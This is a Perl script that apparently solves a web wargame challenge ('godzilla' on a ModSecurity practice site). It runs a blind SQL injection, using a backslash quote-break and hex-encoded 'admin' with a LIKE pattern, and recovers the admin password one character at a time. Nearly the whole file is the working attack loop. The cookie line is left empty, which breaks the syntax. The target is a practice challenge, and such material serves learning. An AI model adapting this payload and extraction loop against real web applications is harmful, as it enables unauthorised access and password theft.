#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;

$ENV{PERL_LWP_SSL_CA_FILE} = '/etc/ssl/cert.pem';
$|++;

use Data::Dumper;

my @charset = (
  #33  ..  47,  # !"#$%&'()*+,-./
  48  ..  57,  # 0-9
  #58  ..  64,  # :;<=>?@
  #65  ..  70,  # A-F
  #97  ..  102, # a-f
  #65  ..  90,  # A-Z
  #91  ..  96,  # [\]^_`
  97  ..  122, # a-z
  #123 ..  126, # {|}~
);

my $url =
"https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php"
;

my $cookie =
;

my $ua = LWP::UserAgent->new;
my $found = '';
my $ascii = '';
my $index = 0;

while (1) { # unknown pwd length
  $index++;

  for my $ord (@charset) {
    my $hex  = sprintf "%x", $ord;
    my $char = chr $ord;

    print $char;

    my $payload =
    "?id=%5C&pw=%7C%7Cid=0x61646d696e%26%26pw%20like%20" .
    "0x${found}${hex}25%23"
    ;

    my $resp = $ua->get( $url.$payload, 'Cookie' => $cookie );

    if ( $resp->is_error ) {
      printf "\n[%d] %s\n", $resp->code, $resp->message;
      redo;
    }

    if ($resp->content =~ '<h2>Hello admin</h2>') {
      $found .= $hex;
      $ascii .= $char;
      print "\n$index => $hex ($char), Total: '$found / $ascii'\n";
      last;
    }
    else {
      $found .= chr 219 if $index == $#charset; # last char and not found
    }
  }
}
# vim:sw=2:ts=2:sts=2:et:cc=80
# End of file
